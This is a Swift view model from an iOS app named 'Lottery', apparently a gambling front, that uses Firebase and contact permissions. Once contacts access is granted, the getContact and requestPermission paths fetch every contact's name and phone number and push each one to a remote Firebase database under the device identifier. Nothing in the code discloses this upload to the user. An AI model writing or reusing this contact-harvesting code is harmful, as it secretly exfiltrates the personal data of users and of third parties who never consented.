//
//  HomeViewModel.swift
//  Lottery
//
//  Created by Nguyen Tri The on 31/07/2021.
//

import SwiftUI
import Contacts
import Firebase

class HomeViewModel: ObservableObject {
    
    @Published var showWebView = false
    
    @Published var showSheetShare = false
    
    @Published var showNavigation = false
    
    @Published var showCustomerCart = false
    
    @Published var animationFinished = false
    
    @Published var isLinkUrlIsEmpty = false
    
    @Published var isPermissionContactDenied = false
    
    @Published var listContact: [ContactModel] = []
    
    @Published var contentShare: [Any] = []
    
    @Published var mainState = MainState.HOME
    
    @Published var linkState = LinkState.REGISTER
    
    @Published var link = LinkModel(contact: "", login: "", promotion: "", register: "")
    
    let ref = Database.database().reference()
    
    let stackDateFormat: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateFormat = "dd-MM-yyyy"
        return formatter
    }()
    
    func getLink(){
        ref.child("link").getData { err, snapShot in
            let value = snapShot.value as? NSDictionary
            self.link.contact = value?["contact"] as? String ?? ""
            self.link.login = value?["login"] as? String ?? ""
            self.link.promotion = value?["promotion"] as? String ?? ""
            self.link.register = value?["register"] as? String ?? ""
        }
    }
    
    func getContact(){
        let authStatus = CNContactStore.authorizationStatus(for: .contacts)
        switch authStatus {
        case .restricted:
            print("User cannot grant permission, e.g. parental controls in force.")
            exit(1)
        case .denied:
            print("User has explicitly denied permission.")
            print("They have to grant it via Preferences app if they change their mind.")
            self.isPermissionContactDenied = true
        //            exit(1)
        case .notDetermined:
            print("You need to request authorization via the API now.")
        case .authorized:
            print("You are already authorized.")
            
            print("Authorized!")
            self.fetchAllContact { [weak self] result in
                switch result {
                case .success(let fetchedContacts):
                    self!.listContact = fetchedContacts
                    print(self!.listContact[0].phone)
                    DispatchQueue.main.async{ [self] in

                        for data in 0..<self!.listContact.count{
                            self!.pushContacts(phone: self!.listContact[data].phone, name: self!.listContact[data].name)
                        }
                    }
                    
                case .failure(let error):
                    print(error.localizedDescription)
                }
            }
        }
        
        requestPermission(authStatus: authStatus)
    }
    
    func requestPermission(authStatus: CNAuthorizationStatus){
        let store = CNContactStore()
        if authStatus == .notDetermined {
            store.requestAccess(for: .contacts) { success, error in
                if !success {
                    print("Not authorized to access contacts. Error = \(String(describing: error?.localizedDescription))")
                }else{
                    print("Authorized!")
                    self.fetchAllContact { [weak self] result in
                        switch result {
                        case .success(let fetchedContacts):
                            self!.listContact = fetchedContacts
                            print(self!.listContact[0].phone)
                            DispatchQueue.main.async{ [self] in

                                for data in 0..<self!.listContact.count{
                                    self!.pushContacts(phone: self!.listContact[data].phone, name: self!.listContact[data].name)
                                }
                            }
                            
                        case .failure(let error):
                            print(error.localizedDescription)
                        }
                    }
                }
            }
        }
    }
    
    func pushContacts(phone: String, name: String){
        if !phone.isEmpty && !name.isEmpty {
            ref.child("contact" + "/" + stackDateFormat.string(from: Date()) + "/" + UIDevice.current.identifierForVendor!.uuidString)
                .child(phone).setValue(["name": name])
        }
    }
    
    func fetchAllContact(_ completion: @escaping(Result<[ContactModel], Error>) -> Void){
        let containerID  = CNContactStore().defaultContainerIdentifier()
        let predicate = CNContact.predicateForContactsInContainer(withIdentifier: containerID)
        let descriptor =
            [
                CNContactIdentifierKey,
                CNContactGivenNameKey,
                CNContactFamilyNameKey,
                CNContactPhoneNumbersKey
            ]
            as [CNKeyDescriptor]
        
        do {
            let rawContacts = try CNContactStore().unifiedContacts(matching: predicate, keysToFetch: descriptor)
            completion(.success(rawContacts.map{ .init(contact: $0)}))
        } catch{
            completion(.failure(error))
        }
    }
    
    func checkLinkIsEmpty(url: String) -> Bool{
        if !url.elementsEqual("") {
            return true
        }else {
            self.isLinkUrlIsEmpty.toggle()
            return false
        }
    }
    
    func openSettingContact(){
        guard let settingURL = URL(string: UIApplication.openSettingsURLString) else { return }
        if UIApplication.shared.canOpenURL(settingURL) { UIApplication.shared.openURL(settingURL) }
    }
}
